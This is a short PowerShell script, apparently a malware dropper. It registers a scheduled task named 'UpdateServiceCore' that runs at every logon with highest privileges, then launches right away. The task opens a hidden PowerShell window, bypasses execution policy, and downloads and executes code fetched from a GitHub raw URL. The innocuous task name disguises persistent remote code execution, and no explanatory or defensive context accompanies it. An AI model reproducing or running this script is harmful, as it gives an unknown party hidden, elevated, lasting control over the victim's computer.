$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name

schtasks /create /tn "UpdateServiceCore" /tr "powershell -WindowStyle Hidden -Exec Bypass -c iex (iwr 'https://raw.githubusercontent.com/X3D4L/pastebin/refs/heads/main/code')" /sc onlogon /ru $currentUser /f /rl highest /z

schtasks /run /tn "UpdateServiceCore"
exit
